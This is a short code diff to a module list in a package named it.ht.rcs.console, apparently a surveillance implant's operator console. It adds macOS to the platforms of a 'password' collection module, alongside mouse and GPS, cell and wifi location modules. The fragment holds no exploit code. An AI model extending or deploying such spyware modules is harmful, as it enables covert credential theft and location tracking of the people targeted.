@@ -80,7 +80,7 @@ package it.ht.rcs.console
 
 				{module: "mouse", width: 50, height: 50, _type: "desktop", _platform: "windows,osx,linux"},
 
-				{module: "password", _type: "desktop,mobile", _platform: "windows,symbian,linux,android"},
+				{module: "password", _type: "desktop,mobile", _platform: "windows,symbian,linux,android,osx"},
 
 				{module: "position", gps: false, cell: true, wifi: true, _type: "desktop,mobile", _platform: "windows,osx,blackberry,winmo,symbian,android,ios,linux,winphone"},
 
